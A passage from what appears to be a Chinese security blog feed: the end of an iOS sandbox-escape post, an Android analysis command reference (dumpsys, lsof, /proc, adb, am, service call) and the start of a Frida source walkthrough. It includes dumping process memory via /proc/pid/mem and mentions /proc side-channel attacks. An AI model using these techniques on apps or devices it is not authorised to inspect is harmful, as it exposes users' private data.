port，利用ROP已经实现了代码执行,再寻找其他的garget实现任意函数调用。</p><p><img src="/images/pasted-98.png" alt="upload successful"></p><p>这里作者并没有细说，期待更多的技术细节。</p><p>参考：</p><ol><li><a href="iOS jailbreak internals (2">https://weibo.com/ttarticle/p/show?id=2309404271293301154324#_0</a>: Escaping sandbox using callbacks)</li><li><a href="http://newosxbook.com/files/HITSB.pdf" target="_blank" rel="noopener">Hack in the (sand)Box</a></li><li><a href="https://www.jianshu.com/p/a764aad31847" target="_blank" rel="noopener">Mach消息发送机制</a></li><li><a href="http://2013.zeronights.org/includes/docs/Meder_Kydyraliev_-_Mining_Mach_Services_within_OS_X_Sandbox.pdf" target="_blank" rel="noopener">Mining_Mach_Services_within_OS_X_Sandbox</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android分析常用的工具或命令</title>
      <link href="/2018/08/02/ndroid%E5%88%86%E6%9E%90%E5%B8%B8%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%88%96%E5%91%BD%E4%BB%A4/"/>
      <url>/2018/08/02/ndroid%E5%88%86%E6%9E%90%E5%B8%B8%E7%94%A8%E7%9A%84%E5%B7%A5%E5%85%B7%E6%88%96%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="dumpsys"><a href="#dumpsys" class="headerlink" title="dumpsys"></a>dumpsys</h2><p>dumpsys命令用来查询界面元素层级、系统服务运行状态、电池、网络等一些信息。<br>用法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HWVTR:/ # dumpsys --help</span><br><span class="line">usage: dumpsys</span><br><span class="line">         To dump all services.</span><br><span class="line">or:</span><br><span class="line">       dumpsys [-t TIMEOUT] [--help | -l | --skip SERVICES | SERVICE [ARGS]]</span><br><span class="line">         --help: shows this help</span><br><span class="line">         -l: only list services, do not dump them</span><br><span class="line">         -t TIMEOUT: TIMEOUT to use in seconds instead of default 10 seconds</span><br><span class="line">         --skip SERVICES: dumps all services but SERVICES (comma-separated list)</span><br><span class="line">         SERVICE [ARGS]: dumps only service SERVICE, optionally passing ARGS to it</span><br></pre></td></tr></table></figure></p><p>常用功能：</p><ol><li>dumpsys activity activities | grep mResumedActivity 获取顶层activity</li><li>dumpsys -l  列出所有运行的服务</li><li>dumpsys wifiscanner 获取wifi信息</li><li>dumpsys webviewupdate 获得webview版本等信息</li><li>dumpsys usagestats|grep com.tencent.mm  某个APP的使用情况</li><li>dumpsys shortcut 所有的shortcut</li><li>dumpsys package -h  所有和package相关</li><li>dumpsys ethernet  屏幕信息</li><li>dumpsys battery 电池状态</li><li>dumpsys BastetService DNS信息</li></ol><p>参考：<a href="https://developer.android.com/studio/command-line/dumpsys" target="_blank" rel="noopener">https://developer.android.com/studio/command-line/dumpsys</a></p><h2 id="lsof"><a href="#lsof" class="headerlink" title="lsof"></a>lsof</h2><p>lsof命令用于查看进程开打的文件，打开文件的进程，进程打开的端口(TCP、UDP)。lsof必须以root运行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-a：列出打开文件存在的进程；</span><br><span class="line">-c&lt;进程名&gt;：列出指定进程所打开的文件；</span><br><span class="line">-g：列出GID号进程详情；</span><br><span class="line">-d&lt;文件号&gt;：列出占用该文件号的进程；</span><br><span class="line">+d&lt;目录&gt;：列出目录下被打开的文件；</span><br><span class="line">+D&lt;目录&gt;：递归列出目录下被打开的文件；</span><br><span class="line">-n&lt;目录&gt;：列出使用NFS的文件；</span><br><span class="line">-i&lt;条件&gt;：列出符合条件的进程。（4、6、协议、:端口、 @ip ）</span><br><span class="line">-p&lt;进程号&gt;：列出指定进程号所打开的文件；</span><br><span class="line">-u：列出UID号进程详情；</span><br><span class="line">-h：显示帮助信息；</span><br><span class="line">-v：显示版本信息。</span><br></pre></td></tr></table></figure></p><p>Android 系统中的lsof不完全支持以上操作，需要安装busybox<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">OnePlus5T:/ # lsof --help</span><br><span class="line">usage: lsof [-lt] [-p PID1,PID2,...] [NAME]...</span><br><span class="line"></span><br><span class="line">Lists open files. If names are given on the command line, only</span><br><span class="line">those files will be shown.</span><br><span class="line"></span><br><span class="line">-llist uids numerically</span><br><span class="line">-pfor given comma-separated pids only (default all pids)</span><br><span class="line">-tterse (pid only) output</span><br></pre></td></tr></table></figure></p><p>lsof输出格式为：</p><p><img src="/images/pasted-76.png" alt="upload successful"></p><p>常用到的命令：</p><ul><li>lsof -p [pid] 监控某个进程打开的文件</li><li>lsof [filename] 查找某个文件被谁打开</li><li>lsof -i似乎在android或busybox上不可用，配合grep使用,例如：lsof|grep “TCP :27042”</li></ul><h2 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h2><p>/proc是一种虚拟文件系统（/proc/xxx 文件本身的大小却会显示为0字节），存储的是当前内核运行状态的一系列特殊文件，可以通过这些文件查看有关系统硬件及当前正在运行进程的信息。</p><p>由于/proc目录下部分文件是可以被全局可读的，因此经常用来进行侧信道攻击。</p><p>如下为Android 7.1.1 OnePlus手机上的proc目录：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">dr-xr-xr-x   9 root         root       0 2018-08-06 13:55 998</span><br><span class="line">... 略去大部分pid</span><br><span class="line">dr-xr-xr-x   3 root         root       0 2018-08-06 12:05 asound</span><br><span class="line">dr-xr-xr-x   2 root         root       0 2018-08-07 11:45 ath_pktlog</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 bootloader_log</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 buddyinfo</span><br><span class="line">dr-xr-xr-x   4 root         root       0 2018-08-07 11:45 bus</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 cgroups</span><br><span class="line">dr-xr-xr-x   2 root         root       0 2018-08-07 11:45 cld</span><br><span class="line">-r--r-----   1 root         radio      0 2018-08-07 11:45 cmdline</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 consoles</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 cpuinfo</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 crypto</span><br><span class="line">dr-xr-xr-x   2 root         root       0 2018-08-07 11:45 debug</span><br><span class="line">dr-xr-xr-x   2 root         root       0 2018-08-07 11:45 debugdriver</span><br><span class="line">lrwxrwxrwx   1 root         root      29 2018-08-07 11:45 device-tree -&gt; /sys/firmware/devicetree/base</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 devices</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 diskstats</span><br><span class="line">dr-xr-xr-x   2 root         root       0 2018-08-07 11:45 driver</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 execdomains</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 fb</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 filesystems</span><br><span class="line">dr-xr-xr-x   5 root         root       0 2018-08-07 11:45 fs</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 interrupts</span><br><span class="line">-r--------   1 root         root       0 2018-08-07 11:45 iomem</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 ioports</span><br><span class="line">dr-xr-xr-x 223 root         root       0 2018-08-07 11:45 irq</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 kallsyms</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 key-users</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 keys</span><br><span class="line">-r--r-----   1 root         system     0 1970-09-03 05:58 kmsg</span><br><span class="line">-r--------   1 root         root       0 2018-08-07 11:45 kpagecount</span><br><span class="line">-r--------   1 root         root       0 2018-08-07 11:45 kpageflags</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 loadavg</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 locks</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 mdstat</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 meminfo</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 misc</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 modules</span><br><span class="line">lrwxrwxrwx   1 root         root      11 2018-08-07 11:45 mounts -&gt; self/mounts</span><br><span class="line">lrwxrwxrwx   1 root         root       8 2018-08-07 11:45 net -&gt; self/net</span><br><span class="line">-rw-rw-rw-   1 root         root       0 2018-08-07 11:45 network_info</span><br><span class="line">-rw-rw-rw-   1 root         root       0 2018-08-07 11:45 otrace_on</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 pagetypeinfo</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 partitions</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 proc_state</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 proc_transaction_log</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 proc_transactions</span><br><span class="line">-rw-r--r--   1 root         root       0 2018-08-07 11:45 restart_level_all</span><br><span class="line">-rw-rw-rw-   1 root         root       0 2018-08-07 11:45 rf_cable_config</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 schedstat</span><br><span class="line">dr-xr-xr-x   3 root         root       0 2018-08-07 11:45 scsi</span><br><span class="line">lrwxrwxrwx   1 root         root       0 1970-01-01 08:00 self -&gt; 15165</span><br><span class="line">-rw-r--r--   1 system       system     0 2018-08-07 11:45 ship_mode</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 softirqs</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 stat</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 swaps</span><br><span class="line">dr-xr-xr-x   1 root         root       0 1970-09-03 05:57 sys</span><br><span class="line">--w--w----   1 root         system     0 2018-08-07 11:45 sysrq-trigger</span><br><span class="line">lrwxrwxrwx   1 root         root       0 1970-01-01 08:00 thread-self -&gt; 15165/task/15165</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 timer_list</span><br><span class="line">-rw-r--r--   1 root         root       0 2018-08-07 11:45 timer_stats</span><br><span class="line">dr-xr-xr-x   2 root         root       0 2018-08-07 11:45 touchpanel</span><br><span class="line">dr-xr-xr-x   4 root         root       0 2018-08-07 11:45 tty</span><br><span class="line">dr-xr-xr-x   2 root         root       0 2018-08-07 11:45 tzdbg</span><br><span class="line">dr-xr-xr-x   2 root         root       0 2018-08-07 11:45 uid_cputime</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 uptime</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 version</span><br><span class="line">-r--r-----   1 root         log        0 2018-08-07 11:45 vmallocinfo</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 vmstat</span><br><span class="line">-r--r--r--   1 root         root       0 2018-08-07 11:45 zoneinfo</span><br></pre></td></tr></table></figure></p><p>某个进程下的文件（/proc/[pid]/）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">OnePlus5T:/proc/6537 # ls -l</span><br><span class="line">total 0</span><br><span class="line">dr-xr-xr-x   2 u0_a139 u0_a139 0 2018-08-06 12:08 attr</span><br><span class="line">-rw-r--r--   1 root    root    0 2018-08-07 11:50 autogroup</span><br><span class="line">-r--------   1 root    root    0 2018-08-07 11:50 auxv</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-07 11:50 cgroup</span><br><span class="line">--w-------   1 root    root    0 2018-08-07 11:50 clear_refs</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-07 11:03 cmdline</span><br><span class="line">-rw-r--r--   1 root    root    0 2018-08-07 11:50 comm</span><br><span class="line">-rw-r--r--   1 root    root    0 2018-08-07 11:50 coredump_filter</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-07 11:50 cpuset</span><br><span class="line">lrwxrwxrwx   1 root    root    0 2018-08-07 11:03 cwd -&gt; /</span><br><span class="line">-r--------   1 root    root    0 2018-08-07 11:50 environ</span><br><span class="line">lrwxrwxrwx   1 root    root    0 2018-08-07 11:03 exe -&gt; /system/bin/app_process32_xposed</span><br><span class="line">dr-x------   2 root    root    0 2018-08-07 11:03 fd</span><br><span class="line">dr-x------   2 root    root    0 2018-08-07 11:03 fdinfo</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-07 11:50 limits</span><br><span class="line">dr-x------   2 root    root    0 2018-08-07 11:50 map_files</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-07 11:03 maps</span><br><span class="line">-rw-------   1 root    root    0 2018-08-07 11:50 mem</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-07 11:50 mountinfo</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-07 11:50 mounts</span><br><span class="line">-r--------   1 root    root    0 2018-08-07 11:50 mountstats</span><br><span class="line">dr-xr-xr-x  10 u0_a139 u0_a139 0 2018-08-06 12:08 net</span><br><span class="line">dr-x--x--x   2 root    root    0 2018-08-07 11:50 ns</span><br><span class="line">-r--------   1 root    root    0 2018-08-07 11:50 oom_adj</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-07 11:50 oom_score</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-06 12:11 oom_score_adj</span><br><span class="line">-r--------   1 root    root    0 2018-08-07 11:50 pagemap</span><br><span class="line">-r--------   1 root    root    0 2018-08-07 11:50 personality</span><br><span class="line">lrwxrwxrwx   1 root    root    0 2018-08-07 11:03 root -&gt; /</span><br><span class="line">-rw-rw-rw-   1 root    root    0 2018-08-07 11:50 sched_group_id</span><br><span class="line">-rw-r--r--   1 root    root    0 2018-08-07 11:50 sched_init_task_load</span><br><span class="line">-rw-r--r--   1 root    root    0 2018-08-07 11:50 sched_wake_up_idle</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-07 11:50 schedstat</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-06 12:10 smaps</span><br><span class="line">-r--------   1 root    root    0 2018-08-07 11:50 stack</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-06 12:08 stat</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-07 11:50 statm</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-07 11:50 status</span><br><span class="line">-r--------   1 root    root    0 2018-08-07 11:50 syscall</span><br><span class="line">dr-xr-xr-x 155 u0_a139 u0_a139 0 2018-08-06 12:11 task</span><br><span class="line">-rw-rw-rw-   1 root    root    0 2018-08-07 11:50 timerslack_ns</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-07 11:50 wakeup</span><br><span class="line">-r--r--r--   1 root    root    0 2018-08-07 11:03 wchan</span><br></pre></td></tr></table></figure></p><p>研究中常用到的文件：</p><ul><li><strong>/proc/pid/maps</strong> 文件、内存映射信息，配合dd使用<br>/proc/6537/map_files/ 目录下保存maps中所有文件的软连接</li></ul><p><img src="/images/pasted-77.png" alt="upload successful"></p><ul><li><p><strong>/proc/pid/mem</strong> 文件io，配合dd使用,也可用open打开，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/proc/$pid/mem of=output_file ibs=1 offset=1234</span><br></pre></td></tr></table></figure></li><li><p><strong>/proc/pid/status</strong> 进程状态信息，可用于查看进程是否被调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">OnePlus5T:/proc/6537 # cat status</span><br><span class="line">Name:com.tencent.mm</span><br><span class="line">State:S (sleeping)</span><br><span class="line">Tgid:6537</span><br><span class="line">Pid:6537</span><br><span class="line">PPid:883</span><br><span class="line">TracerPid:0 (非零表示被调试)</span><br><span class="line">Uid:10139101391013910139</span><br><span class="line">Gid:10139101391013910139</span><br><span class="line">……</span><br></pre></td></tr></table></figure></li><li><p><strong>/proc/[pid]/cwd</strong> 当前工作目录的符号链接</p></li><li><strong>/proc/[pid]/task</strong> 每个线程一个子目录，目录名为线程ID（付款码侧信道攻击）</li></ul><p>参考：<br>深入解析Linux proc文件系统 <a href="https://blog.csdn.net/ieearth/article/details/72849990" target="_blank" rel="noopener">https://blog.csdn.net/ieearth/article/details/72849990</a></p><h2 id="Monkey"><a href="#Monkey" class="headerlink" title="Monkey"></a>Monkey</h2><p>monkey是android系统自带的一款测试工具<br>例如启动com.tencent.mm应用，并随机发送500个事件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell monkey -p com.tencent.mm -v 500</span><br></pre></td></tr></table></figure></p><h2 id="busybox"><a href="#busybox" class="headerlink" title="busybox"></a>busybox</h2><p>BusyBox 是一个集成了三百多个最常用Linux命令和工具的软件, Android中部分命令为linux的阉割版，像awk、wget这些命令，Android中都不提供，因此需要使用busybox完成<br>下载地址：<a href="http://www.busybox.net/downloads/binaries" target="_blank" rel="noopener">http://www.busybox.net/downloads/binaries</a> 选择合适的架构即可</p><h2 id="screencap和screenrecord"><a href="#screencap和screenrecord" class="headerlink" title="screencap和screenrecord"></a>screencap和screenrecord</h2><p><strong>截屏</strong>：adb shell screencap -p /sdcard/tmp.png<br><strong>录像</strong>：adb shell screenrecord /sdcard/demo.mp4</p><h2 id="adb-shell-input"><a href="#adb-shell-input" class="headerlink" title="adb shell input"></a>adb shell input</h2><ul><li>adb shell input text  “hello,world” 获得焦点后输入文字</li><li>adb shell keyevent [–longpress] <keycode> 按键<br>例如：adb shell keyevent 26 或 input keyevent “KEYCODE_POWER” 两个都可以锁屏<br>所有的keycode参考：<a href="https://developer.android.com/reference/android/view/KeyEvent.html" target="_blank" rel="noopener">https://developer.android.com/reference/android/view/KeyEvent.html</a></keycode></li><li>adb shell tap <x> <y>  点击屏幕<br>例如：adb shell input tap 50 250  点击x=50 y=250的位置</y></x></li><li>adb shell swipe <x1> <y1> <x2> <y2> [duration(ms)]  滑动屏幕<br>例如：adb shell input swipe 50 250 250 250 500 最后一位为滑动时间</y2></x2></y1></x1></li></ul><h2 id="adb-logcat"><a href="#adb-logcat" class="headerlink" title="adb logcat"></a>adb logcat</h2><ul><li>”-s”选项 : 设置输出日志的标签, 只显示该标签的日志;<br>例如：adb logcat -s System.out </li><li>”-f”选项 : 将日志输出到文件,  -f 参数执行不成功 默认输出到标准输出流中;<br>例如：adb logcat -f /tmp/log.txt</li><li>”-c”选项 : 清空所有的日志缓存信息;</li><li>“-e”选项 ：正则匹配<br>例如：logcat -e “.*wifi”</li><li>“–pid=<pid>” ：根据pid筛选log<br>例如： adb logcat –pid=1234  </pid></li><li>配合grep<br>例如： adb logcat | grep -i Wifi</li><li><tag>[:priority] tag为标签或<em>,priority为以下几种：<br>– V : Verbose (明细);<br>– D : Debug (调试);<br>– I : Info (信息);<br>– W : Warn (警告);<br>– E : Error (错误);<br>– F: Fatal (严重错误);<br>– S : Silent(Super all output) (最高的优先级, 可能不会记载东西);<br>例如： “adb logcat </em>:E”  输出所有的Error日志</tag></li></ul><h2 id="am命令"><a href="#am命令" class="headerlink" title="am命令"></a>am命令</h2><ul><li>am start<br>am start -n 包名/activity -d data<br>am start -n 包名/activity -e extra (–es <extra_key> <extra_string_value> –ei <extra_key> <extra_int_value>)<br>am start -a android.intent.action.VIEW -d <a href="http://www.google.cn/" target="_blank" rel="noopener">http://www.google.cn/</a></extra_int_value></extra_key></extra_string_value></extra_key></li><li>am startservice<br>am startservice -n 包名/服务名</li><li>am broadcast<br>am broadcast -a com.android.test (–es test_string “this is test string” –ei test_int 100 –ez test_boolean true) </li></ul><h2 id="netstat"><a href="#netstat" class="headerlink" title="netstat"></a>netstat</h2><p>查看设备的端口号信息，（warmwhole检测）<br>-r  Display routing table.<br>-a  Display all sockets (Default: Connected).<br>-l  Display listening server sockets.<br>-t  Display TCP sockets.<br>-u  Display UDP sockets.<br>-w  Display Raw sockets.<br>-x  Display Unix sockets.<br>-e  Display other/more information.<br>-n  Don’t resolve names.<br>-p  Display PID/Program name for sockets.</p><p>例如：netstat -lp  显示所有监听的socket以及对应的pid<br><img src="/images/pasted-78.png" alt="upload successful"></p><h2 id="getprop和setprop"><a href="#getprop和setprop" class="headerlink" title="getprop和setprop"></a>getprop和setprop</h2><ul><li>getprop默认获得所有的参数，常用参数如下：<br>getprop ro.debuggable<br>getprop ro.build.product<br>getprop ro.build.fingerprint<br>getprop ro.serialno</li><li>setprop [key] [value],有些需要特殊权限</li></ul><h2 id="svc"><a href="#svc" class="headerlink" title="svc"></a>svc</h2><p>命令行下控制数据、wifi等开关</p><ul><li>svc data enable 打开数据流量<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">OnePlus5T:/ # svc</span><br><span class="line">Available commands:</span><br><span class="line">    help         Show information about the subcommands</span><br><span class="line">    power        Control the power manager</span><br><span class="line">    data         Control mobile data connectivity</span><br><span class="line">    wifi         Control the Wi-Fi manager</span><br><span class="line">    usb          Control Usb state</span><br><span class="line">    nfc          Control NFC functions</span><br><span class="line">    bluetooth    Control Bluetooth service</span><br></pre></td></tr></table></figure></li></ul><h2 id="service"><a href="#service" class="headerlink" title="service"></a>service</h2><ul><li>service list 列出所有的服务</li><li>service call 调用服务<br>用法：service call CODE [i32 N | i64 N | f N | d N | s16 STR ]<br>例如：service call phone 1 s16 “10086” 打电话</li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Frida源码分析</title>
      <link href="/2018/07/31/Mac%E4%B8%8A%E7%BC%96%E8%AF%91Frida/"/>
      <url>/2018/07/31/Mac%E4%B8%8A%E7%BC%96%E8%AF%91Frida/</url>
      
        <content type="html"><![CDATA[<h2 id="frida代码结构："><a href="#frida代码结构：" class="headerlink" title="frida代码结构："></a>frida代码结构：</h2><p><strong>frida-core</strong>: Frida core library intended for static linking into bindings<br><strong>frida-gum</strong>: Low-level code instrumentation library used by frida-core<br>bindings:<br><strong>frida-python</strong>: Frida Python bindings<br><strong>frida-node</strong>: Frida Node.js bindings<br><strong>frida-qml</strong>: Frida Qml plugin<br><strong>frida-swift</strong>: Frida Swift bindings<br><strong>frida-tools</strong>: Frida CLI tools<br><strong>capstone</strong>: instruction disammbler </p><h3 id="frida-gum解析："><a href="#frida-gum解析：" class="headerlink" title="frida-gum解析："></a>frida-gum解析：</h3><p>frida-gum 本身就是一种跨平台的设计. 有两个点需要处理统一: 1. 针对 CPU 架构的代码 2. 针对操作系统(Backend) 的代码. 同时要在这两个点上构建 CPU/OS 无关代码, 以及规定一些统一的接口.</p><p>frida-gum/gum/arch-* 定义的是与 CPU 架构有关的代码,也就是汇编级操作, 比如汇编指令的读/写/修复.</p><p>frida-gum/gum/backend-* 分两种情况: 1. 定义的是与操作系统有关的代码, 更多是一些内存/进程等操作 2. 对 arch 层级代码的封装成统一逻辑</p><p>frida-gum/* 对 arch 和 backend 的抽象封装成上层的平台/架构无关代码.</p><p>frida-gum/bindings/gumjs/：<br>分V8和Duktape两个引擎，实现了Module、Memory、NativeFunction等功能（<a href="https://www.frida.re/docs/javascript-api/）" target="_blank" rel="noopener">https://www.frida.re/docs/javascript-api/）</a></p><h3 id="两种模式"><a href="#两种模式" class="headerlink" title="两种模式"></a>两种模式</h3><ol><li>attach模式<br>attach到已经存在的进程，核心原理是ptrace修改进程内存，如果进程处于调试状态（traceid不等于0），则attach失败</li><li>spawn模式<br>启动一个新的进程并挂起，在启动的同时注入frida代码，适用于在进程启动前的一些hook，如hook RegisterNative等，注入完成后调用resume恢复进程。</li></ol><h3 id="frida-java解析"><a href="#frida-java解析" class="headerlink" title="frida-java解析"></a>frida-java解析</h3><h4 id="源码结构"><a href="#源码结构" class="headerlink" title="源码结构"></a>源码结构</h4><ul><li><p>index.js:<br>vm VM虚拟机的wrapper<br>classFactory class的wrapper<br>available 逻辑变量,指明当前的进程是否载入了虚拟机<br>androidVersion 当前版本号<br>enumerateLoadedClasses 枚举所有加载的类<br>enumerateLoadedClassesSync 上面那个API的同步版本， 载入完毕才将所有的类作为一个数组返回<br>enumerateClassLoaders Android N以上的支持<br>enumerateClassLoadersSync 同上</p></li><li><p>classFactory.js:<br>use: 找到类<br>implementation: 实现一个函数<br>overloads:<br>$new $alloc $init</p></li><li><p>vm.js:<br>getEnv<br>perform<br>attachCurrentThread<br>DetachCurrentThread</p></li><li><p>android.js<br>/<em>global Memory, Module, NativeCallback, NativeFunction, NULL, Process</em>/<br>getApi<br>ensureClassInitialized<br>getAndroidVersion<br>getAndroidApiLevel<br>getArtMethodSpec<br>getArtThreadSpec<br>getArtThreadFromEnv<br>withRunnableArtThread<br>withAllArtThreadsSuspended<br>makeArtClassVisitor<br>makeArtClassLoaderVisitor<br>cloneArtMethod</p></li><li><p>env.js<br>JNIEnv的wrapper</p></li></ul><h4 id="Hook分析"><a href="#Hook分析" class="headerlink" title="Hook分析"></a>Hook分析</h4><ol><li>implementation 区分了ART实现和Dalvik实现</li></ol><p><img src="/images/pasted-82.png" alt="upload successful"></p><h5 id="Dalvik-hook实现"><a href="#Dalvik-hook实现" class="headerlink" title="Dalvik hook实现"></a>Dalvik hook实现</h5><p>frida兼容了低版本的Android, 低于Android 5.0时，采用Dalvik虚拟机，其核心实现在replaceDalvikImplementation函数中。</p><p>frida的Dalvik hook和xposed的hook原理相同，都是把要hook的java函数变成native函数，并修改函数的入口为自定义的内容，这样在调用时就会执行自定义的代码。</p><p>首先我们看一下Dalvik虚拟机执行java函数过程：</p><p><img src="/images/pasted-83.png" alt="upload successful"><br>第4步dvmCallMethodV会根据accessFlags决定调用native还是java函数，因此修改accessFlags后，Dalvik会认为这个函数是一个native函数，便走向了native分支。</p><p>Java层的每一个函数在Dalvik中都对应一个Method数据结构，在源代码中定义如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 